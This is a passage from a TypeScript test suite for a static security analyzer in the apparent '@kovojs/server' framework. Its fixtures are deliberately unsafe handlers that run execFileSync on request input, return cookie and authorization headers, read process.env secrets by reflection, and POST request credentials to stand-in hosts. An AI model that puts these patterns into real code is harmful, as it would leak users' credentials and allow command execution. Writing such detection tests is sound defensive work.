      ({ ...serverApi }).endpoint('/spread', { handler() { execFileSync('object-spread'); return new Response('ok'); }, method: 'GET', reason: 'spread', response });
      Object.assign({}, serverApi).endpoint('/assign', { handler() { execFileSync('object-assign'); return new Response('ok'); }, method: 'GET', reason: 'assign', response });
      Object.values({ endpoint })[0]('/values', { handler() { execFileSync('object-values'); return new Response('ok'); }, method: 'GET', reason: 'values', response });
      serverApi['end' + 'point']('/computed', { handler() { execFileSync('computed-key'); return new Response('ok'); }, method: 'GET', reason: 'computed', response });
    `);
    const sources = facts
      .filter((fact) => fact.sink === 'child_process.execFileSync')
      .map((fact) => fact.source);
    expect(sources, JSON.stringify(facts)).toEqual(
      expect.arrayContaining([
        "'array-at'",
        "'computed-key'",
        "'map-get'",
        "'object-assign'",
        "'object-spread'",
        "'object-values'",
      ]),
    );
  });

  it('tracks temporal mutable factory containers, descriptors, aliases, and iteration', () => {
    const facts = sinksFor(`
      import { execFileSync } from 'node:child_process';
      import { endpoint } from '@kovojs/server';
      const response = { appOwnedSafety: true, body: 'text', cache: 'no-store' };

      const map = new Map();
      const mapAlias = map;
      mapAlias.set('factory', endpoint);
      map.get('factory')('/map-write', { handler() { execFileSync('map-write'); return new Response('ok'); }, method: 'GET', reason: 'map-write', response });

      const weakKey = {};
      const weak = new WeakMap();
      weak.set(weakKey, endpoint);
      weak.get(weakKey)('/weak-map-write', { handler() { execFileSync('weak-map-write'); return new Response('ok'); }, method: 'GET', reason: 'weak-map-write', response });

      const pushed = [];
      pushed.push(endpoint);
      pushed[0]('/push-write', { handler() { execFileSync('push-write'); return new Response('ok'); }, method: 'GET', reason: 'push-write', response });
      const unshifted = [];
      unshifted.unshift(endpoint);
      unshifted.at(0)('/unshift-write', { handler() { execFileSync('unshift-write'); return new Response('ok'); }, method: 'GET', reason: 'unshift-write', response });
      const spliced = [];
      spliced.splice(0, 0, endpoint);
      spliced[0]('/splice-write', { handler() { execFileSync('splice-write'); return new Response('ok'); }, method: 'GET', reason: 'splice-write', response });

      const set = new Set();
      set.add(endpoint);
      [...set][0]('/set-write', { handler() { execFileSync('set-write'); return new Response('ok'); }, method: 'GET', reason: 'set-write', response });

      const described = {};
      Object.defineProperty(described, 'factory', { get: () => endpoint });
      described.factory('/descriptor-getter', { handler() { execFileSync('descriptor-getter'); return new Response('ok'); }, method: 'GET', reason: 'descriptor-getter', response });
      const describedMany = {};
      Object.defineProperties(describedMany, { factory: { value: endpoint } });
      describedMany.factory('/descriptor-values', { handler() { execFileSync('descriptor-values'); return new Response('ok'); }, method: 'GET', reason: 'descriptor-values', response });
      const reflected = {};
      Reflect.set(reflected, 'factory', endpoint);
      reflected.factory('/reflect-write', { handler() { execFileSync('reflect-write'); return new Response('ok'); }, method: 'GET', reason: 'reflect-write', response });

      const postRead = new Map();
      const missing = postRead.get('factory');
      postRead.set('factory', endpoint);
      if (missing) missing('/post-read', { handler() { execFileSync('post-read-must-stay-safe'); return new Response('ok'); }, method: 'GET', reason: 'post-read', response });
    `);

    const sources = facts
      .filter((fact) => fact.sink === 'child_process.execFileSync')
      .map((fact) => fact.source);
    expect(sources, JSON.stringify(facts)).toEqual(
      expect.arrayContaining([
        "'descriptor-getter'",
        "'descriptor-values'",
        "'map-write'",
        "'push-write'",
        "'reflect-write'",
        "'set-write'",
        "'splice-write'",
        "'unshift-write'",
        "'weak-map-write'",
      ]),
    );
    expect(facts.filter((fact) => fact.sink === 'child_process.execFileSync')).toHaveLength(9);
    expect(JSON.stringify(facts)).not.toContain('post-read-must-stay-safe');
  });

  it('tracks class fields and constructor/prototype writes while rejecting factory proxies', () => {
    const facts = sinksFor(`
      import { execFileSync } from 'node:child_process';
      import { route } from '@kovojs/server';
      const access = { kind: 'public', reason: 'class factory audit' };
      class InstanceField { factory = route; }
      new InstanceField().factory('/instance-field', { access, page() { execFileSync('instance-field'); return 'ok'; } });
      class StaticField { static factory = route; }
      StaticField.factory('/static-field', { access, page() { execFileSync('static-field'); return 'ok'; } });
      class ConstructorField { constructor() { this.factory = route; } }
      new ConstructorField().factory('/constructor-field', { access, page() { execFileSync('constructor-field'); return 'ok'; } });
      class PrototypeField {}
      PrototypeField.prototype.factory = route;
      new PrototypeField().factory('/prototype-field', { access, page() { execFileSync('prototype-field'); return 'ok'; } });
      new Proxy(route, {})('/proxy', { access, page() { execFileSync('proxy'); return 'ok'; } });
      new Proxy(route, { apply() { return () => 'safe'; } })('/opaque-proxy', { access, page() { execFileSync('opaque-proxy'); return 'ok'; } });
    `);

    const sources = facts
      .filter((fact) => fact.sink === 'child_process.execFileSync')
      .map((fact) => fact.source);
    expect(sources, JSON.stringify(facts)).toEqual(
      expect.arrayContaining([
        "'constructor-field'",
        "'instance-field'",
        "'prototype-field'",
        "'static-field'",
      ]),
    );
    expect(facts).toEqual(
      expect.arrayContaining([
        expect.objectContaining({
          sink: 'request-handler.opaque-source',
          source: '<unresolved-mutable-factory-provenance>',
        }),
      ]),
    );
  });

  it('executes module-class instance fields and preserves their wire provenance', () => {
    const facts = sinksFor(`
      import { execFileSync } from 'node:child_process';
      import { mutation, query } from '@kovojs/server';
      let currentProgram;
      let currentRequest;
      class Runner {
        result = execFileSync(currentProgram);
        #privateResult = execFileSync(currentProgram);
        read() { return this.#privateResult; }
      }
      class WireBox {
        token = currentRequest.headers.get('authorization');
      }
      mutation({ handler(input) {
        currentProgram = input.program;
        const runner = new Runner();
        return { result: runner.result, privateResult: runner.read() };
      } });
      query({ load(_input, { request }) {
        currentRequest = request;
        return new WireBox();
      } });
    `);

    expect(facts, JSON.stringify(facts)).toEqual(
      expect.arrayContaining([
        expect.objectContaining({ sink: 'child_process.execFileSync' }),
        expect.objectContaining({ sink: 'client-wire.request.header.Authorization' }),
      ]),
    );
  });

  it('fails closed when decorators can replace request-reachable classes', () => {
    const facts = sinksFor(`
      import { mutation } from '@kovojs/server';
      function replace(Base) { return class extends Base {}; }
      @replace
      class Runner {}
      mutation({ handler() { return new Runner(); } });
    `);

    expect(facts, JSON.stringify(facts)).toEqual(
      expect.arrayContaining([
        expect.objectContaining({ sink: 'request-handler.opaque-protocol' }),
      ]),
    );
  });

  it('normalizes nested and aliased call/apply/construct factory adapters', () => {
    const facts = sinksFor(`
      import { execFileSync } from 'node:child_process';
      import { route } from '@kovojs/server';
      const access = { kind: 'public', reason: 'adapter audit' };
      Function.prototype.call.call(route, null, '/call-call', { access, page() { execFileSync('call-call'); return 'ok'; } });
      const invoke = Reflect.apply;
      invoke(route, null, ['/aliased-reflect', { access, page() { execFileSync('aliased-reflect'); return 'ok'; } }]);
      Reflect.apply.call(null, route, null, ['/reflect-call', { access, page() { execFileSync('reflect-call'); return 'ok'; } }]);
      Reflect.construct(route, ['/reflect-construct', { access, page() { execFileSync('reflect-construct'); return 'ok'; } }]);
    `);

    const sources = facts
      .filter((fact) => fact.sink === 'child_process.execFileSync')
      .map((fact) => fact.source);
    expect(sources, JSON.stringify(facts)).toEqual(
      expect.arrayContaining([
        "'aliased-reflect'",
        "'call-call'",
        "'reflect-call'",
        "'reflect-construct'",
      ]),
    );
  });

  it('resolves handler factories through named, default, namespace, and dynamic-import barrels', () => {
    const facts = sinksForFiles([
      {
        fileName: 'app.ts',
        source: `
          import named from './default.js';
          import { r, server } from './barrel.js';
          import { execFileSync } from 'node:child_process';
          const access = { kind: 'public', reason: 'barrel audit' };
          r('/named', { access, page() { execFileSync('named-barrel'); return 'ok'; } });
          named('/default', { access, page() { execFileSync('default-barrel'); return 'ok'; } });
          server.route('/namespace', { access, page() { execFileSync('namespace-barrel'); return 'ok'; } });
          const dynamic = await import('@kovojs/server');
          dynamic.route('/dynamic', { access, page() { execFileSync('dynamic-import'); return 'ok'; } });
        `,
      },
      {
        fileName: 'barrel.ts',
        source: `
          export { route as r } from '@kovojs/server';
          export * as server from '@kovojs/server';
        `,
      },
      {
        fileName: 'default.ts',
        source: `export { route as default } from '@kovojs/server';`,
      },
    ]);

    const sources = facts
      .filter((fact) => fact.sink === 'child_process.execFileSync')
      .map((fact) => fact.source);
    expect(sources, JSON.stringify(facts)).toEqual(
      expect.arrayContaining([
        "'default-barrel'",
        "'dynamic-import'",
        "'named-barrel'",
        "'namespace-barrel'",
      ]),
    );
  });

  it('fails closed for unresolved createApp declaration collections while following local factories', () => {
    const facts = sinksFor(`
      import { execFileSync } from 'node:child_process';
      import { createApp, route } from '@kovojs/server';
      import { externalRoutes, makeRoutes } from 'external-routes';
      createApp({ routes: externalRoutes });
      createApp({ routes: [...externalRoutes] });
      createApp({ routes: globalThis.__routes });
      createApp({ routes: makeRoutes(route) });
      function parameterFed(routes) { createApp({ routes }); }
      parameterFed([]);
      function localRoutes() {
        return [route('/local', {
          access: { kind: 'public', reason: 'local collection audit' },
          page() { execFileSync('local-collection'); return 'ok'; },
        })];
      }
      createApp({ routes: localRoutes() });
    `);

    expect(
      facts.filter((fact) => fact.sink === 'request-handler.opaque-source').length,
      JSON.stringify(facts),
    ).toBeGreaterThanOrEqual(5);
    expect(facts).toEqual(
      expect.arrayContaining([
        expect.objectContaining({
          sink: 'child_process.execFileSync',
          source: "'local-collection'",
        }),
      ]),
    );
  });

  it('resolves conditional and destructured factories plus mutable callback/config assignments', () => {
    const facts = sinksFor(`
      import * as server from '@kovojs/server';
      import { endpoint, rootedFiles } from '@kovojs/server';

      const { endpoint: destructuredEndpoint } = server;
      const conditionalEndpoint = Math.random() > 0.5 ? endpoint : endpoint;
      let assignedHandler = (_request) => new Response('safe');
      assignedHandler = (request) => {
        rootedFiles(request.url);
        return new Response('assigned');
      };
      const config = {
        handler: (_request) => new Response('initial'),
        method: 'GET',
        reason: 'mutable callback provenance',
        response: { appOwnedSafety: true, body: 'text', cache: 'no-store' },
      };
      conditionalEndpoint('/conditional', config);
      config.handler = assignedHandler;
      destructuredEndpoint('/destructured', {
        ...config,
        handler(request) {
          rootedFiles(request.url);
          return new Response('destructured');
        },
      });
    `);

    expect(
      facts.filter((fact) => fact.sink === '@kovojs/server.rootedFiles'),
      JSON.stringify(facts),
    ).toHaveLength(1);
  });

  it('classifies static app/route wire hints but not currently non-emitted layout hints', () => {
    const facts = sinksFor(
      `
        import { createApp, route } from '@kovojs/server';
        const appStyle = process.env.APP_STYLE;
        const page = route('/', {
          bootstrapScript: import.meta.env.BOOTSTRAP,
          i18n: [{ locale: 'en', messages: { greeting: process.env.GREETING } }],
          meta: { title: process.env.TITLE },
          modulepreloads: [import.meta.env.PRELOAD],
          page: () => 'ok',
          stylesheets: [{ href: process.env.STYLE, criticalCss: import.meta.env.CRITICAL }],
        });
        createApp({ routes: [page], stylesheets: [appStyle] });
      `,
      'app.mts',
    );

    expect(facts.filter((fact) => fact.sink === 'import.meta.env')).toHaveLength(3);
    expect(facts.filter((fact) => fact.sink === 'node:process.env')).toHaveLength(4);

    const layoutFacts = sinksFor(`
      import { layout } from '@kovojs/server';
      layout({
        bootstrapScript: process.env.NON_EMITTED_BOOTSTRAP,
        meta: { title: process.env.NON_EMITTED_TITLE },
        render(_queries, _state, slots) { return slots.children; },
        stylesheets: [process.env.NON_EMITTED_STYLE],
      });
    `);
    expect(layoutFacts.filter((fact) => fact.sink === 'node:process.env')).toEqual([]);
  });

  it('rejects commented, escaped, and constant-computed import.meta.env spellings', () => {
    const facts = sinksFor(
      String.raw`
        import { route } from '@kovojs/server';
        route('/', {
          bootstrapScript: (import /* authority */ . meta).\u0065nv.BOOTSTRAP,
          modulepreloads: [import.meta['e' + 'nv'].PRELOAD],
          page: () => 'ok',
          stylesheets: [import.meta.\u0065nv.STYLE],
        });
      `,
      'app.mts',
    );

    expect(facts.filter((fact) => fact.sink === 'import.meta.env')).toHaveLength(3);
  });

  it('rejects mutable intrinsic-method rebinding and class toJSON credential serialization', () => {
    const facts = sinksFor(`
      import { mutation, query, rootedFiles } from '@kovojs/server';
      const helper: { trim(value: string): unknown } = {
        trim(value) { return value.trim(); },
      };
      helper.trim = rootedFiles;

      mutation({ handler(input) {
        helper.trim(input.root);
        return { ok: true };
      } });
      query({ load(_input, { request }) {
        class CredentialBox {
          toJSON() { return { cookie: request.headers.get('cookie') }; }
        }
        return new CredentialBox();
      } });
    `);

    expect(facts).toEqual(
      expect.arrayContaining([
        expect.objectContaining({ sink: '@kovojs/server.rootedFiles' }),
        expect.objectContaining({ sink: 'client-wire.request.header.Cookie' }),
      ]),
    );
  });

  it('resolves a shared twenty-four-layer conditional callback DAG within a low-second bound', () => {
    const layers = Array.from({ length: 24 }, (_unused, index) => {
      const previous = index === 0 ? 'leaf' : `left${index - 1}`;
      const other = index === 0 ? 'leaf' : `right${index - 1}`;
      return `
        const left${index} = flag ? ${previous} : ${other};
        const right${index} = flag ? ${other} : ${previous};`;
    }).join('\n');
    const started = Date.now();
    const facts = sinksFor(`
      import { execFileSync } from 'node:child_process';
      import { query } from '@kovojs/server';
      const flag = Math.random() > 0.5;
      const leaf = (input) => execFileSync(input.program);
      ${layers}
      query({ load: left23 });
    `);

    expect(facts.filter((fact) => fact.sink === 'child_process.execFileSync')).toHaveLength(1);
    expect(Date.now() - started).toBeLessThan(3_000);
  });

  it('closes route credential HTML, getters, reflective env, computed containers, and iterable copies', () => {
    const facts = sinksFor(`
      import { query, route } from '@kovojs/server';
      export const routeLeak = route('/', { page(_context, request) {
        return request.headers.get('cookie');
      } });
      export const getterLeak = query({ load(_input, { request }) {
        class Box { get token() { return request.headers.get('authorization'); } }
        return { get env() { return process.env.APP_SECRET; }, token: new Box().token };
      } });
      export const defineLeak = query({ load(_input, { request }) {
        const result = {};
        Object.defineProperty(result, 'token', {
          value: request.headers.get('authorization'), enumerable: true,
        });
        return result;
      } });
      export const computedLeak = query({ load(_input, { request }) {
        const result = { [request.headers.get('authorization')]: true };
        result[request.headers.get('cookie')] = true;
        return result;
      } });
      export const computedDestructure = query({ load(input, { request }) {
        const key = input.headers ? 'headers' : 'url';
        const { [key]: selected } = request;
        return selected;
      } });
      export const computedContext = query({ load(input, context) {
        const key = input.requestKey;
        return context[key].headers.get('authorization');
      } });
      export const reflectiveLeak = query({ load() {
        function reveal() { return Reflect.get(process, 'env').APP_SECRET; }
        return {
          descriptor: Object.getOwnPropertyDescriptor(process, 'env').value.OTHER_SECRET,
          global: Reflect.get(globalThis, 'process').env.FOURTH_SECRET,
          iife: (() => process.env.THIRD_SECRET)(),
          local: reveal(),
        };
      } });
      export const mutableName = query({ load(input, { request }) {
        let name = 'content-type';
        if (input.headerName) name = input.headerName;
        return { value: request.headers.get(name) };
      } });
      export const iterable = query({ load(_input, { request }) {
        return [...request.headers];
      } });
    `);

    expect(facts).toEqual(
      expect.arrayContaining([
        expect.objectContaining({ sink: 'client-wire.request.header.Cookie' }),
        expect.objectContaining({ sink: 'client-wire.request.header.Authorization' }),
        expect.objectContaining({ sink: 'client-wire.request.headers.dynamic' }),
        expect.objectContaining({ sink: 'client-wire.request.headers' }),
        expect.objectContaining({ sink: 'client-wire.request.credentials' }),
        expect.objectContaining({ sink: 'node:process.env' }),
      ]),
    );
  });

  it('permits governed fetch/Response body flow but rejects forwarding ambient credentials', () => {
    const safe = sinksFor(`
      import { query } from '@kovojs/server';
      export const remote = query({ async load() {
        const response = await fetch('https://api.example.test/data');
        const cloned = response.clone();
        return { value: await cloned.json() };
      } });
    `);
    expect(safe).toEqual([]);

    const unsafe = sinksFor(`
      import { query } from '@kovojs/server';
      export const remote = query({ async load(input, { request }) {
        await fetch(request.headers.get('authorization'));
        await fetch('https://api.example.test/data', {
          body: request.headers.get('cookie'), method: 'POST',
        });
        await fetch.call(null, 'https://api.example.test/call', {
          body: request.headers.get('authorization'), method: 'POST',
        });
        const boundFetch = fetch.bind(null);
        await boundFetch('https://api.example.test/bound', {
          body: request.headers.get('cookie'), method: 'POST',
        });
        await Reflect.apply(fetch, null, ['https://api.example.test/reflect', {
          body: request.headers.get('authorization'), method: 'POST',
        }]);
        const reflectedCredential = request.headers.get.call(
          request.headers,
          'authorization',
        );
        await fetch('https://api.example.test/header-call', {
          body: reflectedCredential, method: 'POST',
        });
        const dynamicArgs = input.enabled
          ? ['https://api.example.test/left']
          : ['https://api.example.test/right'];
        await Reflect.apply(fetch, null, dynamicArgs);
        return { ok: true };
      } });
    `);
    expect(unsafe.map((fact) => fact.sink)).toEqual(
      expect.arrayContaining([
        'outbound-fetch.request.header.Authorization',
        'outbound-fetch.request.header.Cookie',
        'outbound-fetch.dynamic-arguments',
      ]),
    );
  });

  it('reviews pure Drizzle expression builders without opening opaque package calls', () => {
    const safe = sinksFor(`
      import { and, eq, isNotNull } from 'drizzle-orm';
      import { query } from '@kovojs/server';
      const users = { id: {}, name: {} };
      export const byId = query({ load(input, context) {
        return context.db.select().from(users).where(and(eq(users.id, input.id), isNotNull(users.name)));
      } });
    `);
    expect(safe).toEqual([]);

    const unsafe = sinksFor(`
      import { sql } from 'drizzle-orm';
      import { query } from '@kovojs/server';
      export const raw = query({ load(input) { return sql(input.value); } });
    `);
    expect(unsafe).toEqual(
      expect.arrayContaining([
        expect.objectContaining({ sink: 'request-handler.opaque-package-call' }),
      ]),
    );
  });

  it('recognizes exact Postgres table and request DB capability chains without blessing lookalikes', () => {
    const schemaSource = `
      import { pgTable, text } from 'drizzle-orm/pg-core';
      export const users = pgTable('users', { id: text('id').primaryKey() });
    `;
    const safe = sinksForFiles([
      {
        fileName: 'schema.ts',
        source: schemaSource,
      },
      {
        fileName: 'app.ts',
        source: `
          import { eq } from 'drizzle-orm';
          import { query } from '@kovojs/server';
          import { users } from './schema.js';
          export const directById = query('direct-by-id', { load(input, db) {
            return db.select({ id: users.id }).from(users).where(eq(users.id, input.id));
          } });
          export const byId = query({ load(input, context) {
            return context.db.select({ id: users.id }).from(users).where(eq(users.id, input.id));
          } });
          export const aliasedById = query({ load(input, context) {
            const db = context!.db!;
            return db.select({ id: users.id }).from(users).where(eq(users.id, input.id));
          } });
        `,
      },
    ]);
    expect(safe).toEqual([]);

    const lookalike = sinksFor(`
      import { query } from '@kovojs/server';
      import { pgTable } from 'local-drizzle';
      const users = pgTable('users', { id: 'id' });
      export const byId = query({ load(_input, context) {
        return context.db.select({ id: users.id }).from(users);
      } });
    `);
    expect(lookalike).toEqual(
      expect.arrayContaining([
        expect.objectContaining({ sink: 'request-handler.opaque-protocol' }),
      ]),
    );

    for (const mutation of [
      `users.id = { forged: true };`,
      `const alias = users; alias.id = { forged: true };`,
      `Object.defineProperty(users, 'id', { value: { forged: true } });`,
      `Object.setPrototypeOf(users, { get id() { return { forged: true }; } });`,
      `const holder = { users }; holder.users.id = { forged: true };`,
      `const holder = [users]; holder[0].id = { forged: true };`,
      `const holder = { table: users }; const { table: alias } = holder; alias.id = { forged: true };`,
      `function mutate(table) { table.id = { forged: true }; } mutate(users);`,
      `users.id.mapFromDriverValue = () => 'forged';`,
      `Object.assign(users.id, { mapFromDriverValue: () => 'forged' });`,
      `Object.defineProperty(users.id, 'mapFromDriverValue', { value: () => 'forged' });`,
      `const column = users.id; column.mapFromDriverValue = () => 'forged';`,
      `const holder = { column: users.id }; holder.column.mapFromDriverValue = () => 'forged';`,
    ]) {
      const mutated = sinksForFiles([
        { fileName: 'schema.ts', source: schemaSource },
        {
          fileName: 'app.ts',
          source: `
            import { query } from '@kovojs/server';
            import { users } from './schema.js';
            ${mutation}
            export const byId = query({ load(_input, context) {
              return context.db.select({ id: users.id }).from(users);
            } });
          `,
        },
      ]);
      expect(mutated, mutation).toEqual(
        expect.arrayContaining([
          expect.objectContaining({ sink: 'request-handler.opaque-protocol' }),
        ]),
      );
    }

    const localAlias = sinksForFiles([
      { fileName: 'schema.ts', source: schemaSource },
      {
        fileName: 'app.ts',
        source: `
          import { query } from '@kovojs/server';
          import { users } from './schema.js';
          const alias = users;
          export const byId = query({ load(_input, context) {
            return context.db.select({ id: alias.id }).from(users);
          } });
        `,
      },
    ]);
    expect(localAlias).toEqual(
      expect.arrayContaining([
        expect.objectContaining({ sink: 'request-handler.opaque-protocol' }),
      ]),
    );
  });

  it('accepts only a direct local schema namespace through postgresSchemaModule', () => {
    const schemaSource = `
      import { pgTable, text } from 'drizzle-orm/pg-core';
      export const users = pgTable('users', { id: text('id').primaryKey() });
    `;
    const exact = sinksForFiles([
      { fileName: 'schema.ts', source: schemaSource },
      {
        fileName: 'runtime-options.ts',
        source: `
          import { postgresSchemaModule } from '@kovojs/server';
          import * as schema from './schema.js';
          export const appRuntimeSchema = postgresSchemaModule(schema);
        `,
      },
    ]);
    expect(exact).toEqual([]);

    const localAlias = sinksForFiles([
      { fileName: 'schema.ts', source: schemaSource },
      {
        fileName: 'runtime-options.ts',
        source: `
          import { postgresSchemaModule } from '@kovojs/server';
          import * as schema from './schema.js';
          const aliasedSchema = schema;
          export const appRuntimeSchema = postgresSchemaModule(aliasedSchema);
        `,
      },
    ]);
    expect(localAlias).toEqual(
      expect.arrayContaining([
        expect.objectContaining({
          sink: 'request-handler.opaque-call',
          source: 'postgresSchemaModule',
        }),
      ]),
    );

    const namespaceCallee = sinksForFiles([
      { fileName: 'schema.ts', source: schemaSource },
      {
        fileName: 'runtime-options.ts',
        source: `
          import * as server from '@kovojs/server';
          import * as schema from './schema.js';
          export const appRuntimeSchema = server.postgresSchemaModule(schema);
        `,
      },
    ]);
    expect(namespaceCallee).toEqual(
      expect.arrayContaining([
        expect.objectContaining({
          sink: 'request-handler.opaque-call',
          source: 'server.postgresSchemaModule',
        }),
      ]),
    );
  });

  it('accepts exact mutation request.db chains without opening request lookalikes', () => {
    const schemaSource = `
      import { pgTable, text } from 'drizzle-orm/pg-core';
      export const contacts = pgTable('contacts', {
        id: text('id').primaryKey(),
        email: text('email').notNull(),
      });
    `;
    const mutationSource = (prefix = '') => `
      import { mutation, publicAccess, s, serverValue } from '@kovojs/server';
      import { eq } from 'drizzle-orm';
      import { contacts } from './schema.js';
      export const addContact = mutation({
        access: publicAccess('fixture'),
        csrf: false,
        csrfJustification: 'fixture',
        input: s.object({ email: s.string() }),
        async handler({ email }, request) {
          ${prefix}
          const [existing] = await request.db
            .select()
            .from(contacts)
            .where(eq(contacts.email, email))
            .limit(1);
          if (existing) return { id: existing.id };
          const id = crypto.randomUUID();
          await request.db
            .insert(contacts)
            .values({ id: serverValue(id, 'server-generated fixture id'), email });
          return { id };
        },
      });
    `;
    const exact = sinksForFiles([
      { fileName: 'schema.ts', source: schemaSource },
      { fileName: 'mutations.ts', source: mutationSource() },
    ]);
    expect(exact).toEqual([]);

    for (const poisoning of [
      `request.db = new Proxy(request.db, {});`,
      `request.db.select = () => null;`,
      `Object.defineProperty(request, 'db', { get() { return new Proxy(request.db, {}); } });`,
      `Object.defineProperty(request.db, 'select', { value: () => null });`,
      `Reflect.set(request, 'db', new Proxy(request.db, {}));`,
    ]) {
      const poisoned = sinksForFiles([
        { fileName: 'schema.ts', source: schemaSource },
        { fileName: 'mutations.ts', source: mutationSource(poisoning) },
      ]);
      expect(poisoned, poisoning).not.toEqual([]);
    }

    const computed = sinksForFiles([
      { fileName: 'schema.ts', source: schemaSource },
      {
        fileName: 'mutations.ts',
        source: mutationSource(
          `const db = request['db']; await db.insert(contacts).values({ email });`,
        ),
      },
    ]);
    expect(computed).not.toEqual([]);

    const defaultedRequest = sinksForFiles([
      { fileName: 'schema.ts', source: schemaSource },
      {
        fileName: 'mutations.ts',
        source: mutationSource().replace(
          `async handler({ email }, request)`,
          `async handler({ email }, request = null)`,
        ),
      },
    ]);
    expect(defaultedRequest).not.toEqual([]);

    for (const source of [
      mutationSource()
        .replace(
          `import { mutation, publicAccess, s, serverValue } from '@kovojs/server';`,
          `import { mutation, publicAccess, s } from '@kovojs/server';\nimport * as server from '@kovojs/server';`,
        )
        .replace(`serverValue(id,`, `server.serverValue(id,`),
      mutationSource(`const markServerValue = serverValue;`).replace(
        `serverValue(id,`,
        `markServerValue(id,`,
      ),
      mutationSource().replace(`'server-generated fixture id'`, `''`),
    ]) {
      expect(
        sinksForFiles([
          { fileName: 'schema.ts', source: schemaSource },
          { fileName: 'mutations.ts', source },
        ]),
      ).not.toEqual([]);
    }

    const rawEnvironmentValue = sinksForFiles([
      { fileName: 'schema.ts', source: schemaSource },
      {
        fileName: 'mutations.ts',
        source: mutationSource().replace(
          `serverValue(id, 'server-generated fixture id')`,
          `serverValue(process.env.CONTACT_ID, 'server-generated fixture id')`,
        ),
      },
    ]);
    expect(rawEnvironmentValue.map((fact) => fact.sink)).toContain('node:process.env');
  });

  it('accepts only exact relational query-builder reads of pristine reviewed tables', () => {
    const schemaSource = `
      import { pgTable, text } from 'drizzle-orm/pg-core';
      export const users = pgTable('users', {
        email: text('email').notNull(),
        id: text('id').primaryKey(),
      });
    `;
    const runtimeFiles = [
      {
        fileName: '_kovo/app-runtime-db-options.ts',
        source: `
          import { postgresAppRuntimeOptions, postgresSchemaModule } from '@kovojs/server';
          import * as schema from '../schema.js';
          export const appRuntimeSchema = postgresSchemaModule(schema);
          export const appRuntimeDbOptions = postgresAppRuntimeOptions({
            schema: appRuntimeSchema,
            seedSql: [],
          });
        `,
      },
      {
        fileName: '_kovo/app-runtime-db.ts',
        source: `
          import { createPostgresAppRuntimeDb } from '@kovojs/server';
          import { appRuntimeDbOptions } from './app-runtime-db-options.js';
          const appDatabase = createPostgresAppRuntimeDb(appRuntimeDbOptions);
          export const appRuntimeDbProvider = appDatabase.db;
        `,
      },
    ];
    const querySource = (body: string, tableModule = './schema.js') => `
      import { query } from '@kovojs/server';
      import { users } from '${tableModule}';
      export const usersQuery = query({
        async load(_input, context) {
          ${body}
        },
      });
      function requireDb(context) {
        const db = context?.db;
        if (!db) throw new Error('missing db');
        return db;
      }
    `;
    const sinks = (
      body: string,
      options: { extraFiles?: { fileName: string; source: string }[]; tableModule?: string } = {},
    ) =>
      sinksForFiles([
        { fileName: 'schema.ts', source: schemaSource },
        ...runtimeFiles,
        ...(options.extraFiles ?? []),
        { fileName: 'queries.ts', source: querySource(body, options.tableModule) },
      ]);

    expect(
      sinks(`
        const db = requireDb(context);
        const rows = await db.query.users.findMany({
          columns: { email: true, id: true },
        });
        const first = await db.query.users.findFirst({ columns: { id: true } });
        return { first, items: rows };
      `),
    ).toEqual([]);

    const decoySource = `
      import { pgTable, text } from 'drizzle-orm/pg-core';
      export const users = pgTable('decoy_users', {
        id: text('id').primaryKey(),
      });
    `;
    expect(
      sinks(`return context.db.query.users.findMany({ columns: { id: true } });`, {
        extraFiles: [{ fileName: 'decoy.ts', source: decoySource }],
        tableModule: './decoy.js',
      }),
      'same-name decoy import',
    ).not.toEqual([]);

    expect(
      sinks(`
        const users = pgTable('local_decoy_users', { id: text('id').primaryKey() });
        return context.db.query.users.findMany({ columns: { id: true } });
      `),
      'same-name local decoy',
    ).not.toEqual([]);

    const hostile: ReadonlyArray<readonly [string, string]> = [
      [
        'computed table',
        `const table = 'users'; return context.db.query[table].findMany({ columns: { id: true } });`,
      ],
      [
        'computed method',
        `const method = 'findMany'; return context.db.query.users[method]({ columns: { id: true } });`,
      ],
      [
        'forged receiver',
        `const db = { query: { users: { findMany() { return process.env.SECRET; } } } }; return db.query.users.findMany({ columns: { id: true } });`,
      ],
      ['callback option', `return context.db.query.users.findMany({ where: () => true });`],
      [
        'extra argument',
        `return context.db.query.users.findMany({ columns: { id: true } }, { forged: true });`,
      ],
      [
        'table mutation',
        `users.id = { forged: true }; return context.db.query.users.findMany({ columns: { id: true } });`,
      ],
      [
        'opaque table projection',
        `const tables = { users }; const projected = tables.users; return context.db.query.projected.findMany({ columns: { id: true } });`,
      ],
      [
        'relational method mutation',
        `context.db.query.users.findMany = () => []; return context.db.query.users.findMany({ columns: { id: true } });`,
      ],
    ];
    for (const [label, body] of hostile) {
      expect(sinks(body), label).not.toEqual([]);
    }
  });

  it('accepts only a universally closed local mutation DB helper', () => {
    const schemaSource = `
      import { pgTable, text } from 'drizzle-orm/pg-core';
      export const contacts = pgTable('contacts', {
        id: text('id').primaryKey(),
        email: text('email').notNull(),
      });
    `;
    const mutationSource = ({
      declaration = 'async function writeContact(request, row) {',
      helperBody = 'await request.db.insert(contacts).values(row);',
      prelude = '',
      invocation = 'await writeContact(request, { email });',
    }: {
      declaration?: string;
      helperBody?: string;
      prelude?: string;
      invocation?: string;
    } = {}) => `
      import { mutation, publicAccess, s } from '@kovojs/server';
      import { contacts } from './schema.js';
      ${declaration}
        ${helperBody}
      }
      ${prelude}
      export const addContact = mutation({
        access: publicAccess('fixture'),
        csrf: false,
        csrfJustification: 'fixture',
        input: s.object({ email: s.string() }),
        async handler({ email }, request) {
          ${invocation}
          return { ok: true };
        },
      });
    `;
    const sinks = (source: string) =>
      sinksForFiles([
        { fileName: 'schema.ts', source: schemaSource },
        { fileName: 'mutations.ts', source },
      ]);

    expect(sinks(mutationSource())).toEqual([]);
    expect(
      sinks(
        mutationSource({
          declaration: 'async function writeContact(db, row) {',
          helperBody: 'await db.insert(contacts).values(row);',
          invocation:
            'await request.db.select().from(contacts); await writeContact(request.db, { email });',
        }),
      ),
    ).toEqual([]);

    const hostile: ReadonlyArray<readonly [string, string]> = [
      [
        'exported helper',
        mutationSource({ declaration: 'export async function writeContact(request, row) {' }),
      ],
      ['export-list helper', mutationSource({ prelude: 'export { writeContact };' })],
      [
        'aliased helper',
        mutationSource({
          invocation: 'const alias = writeContact; await alias(request, { email });',
        }),
      ],
      [
        'stored helper',
        mutationSource({
          prelude: 'const helpers = { writeContact };',
          invocation: 'await helpers.writeContact(request, { email });',
        }),
      ],
      [
        'callback helper',
        mutationSource({
          invocation: '[{ email }].map((row) => writeContact(request, row));',
        }),
      ],
      [
        'Function.call helper',
        mutationSource({
          invocation: 'await writeContact.call(undefined, request, { email });',
        }),
      ],
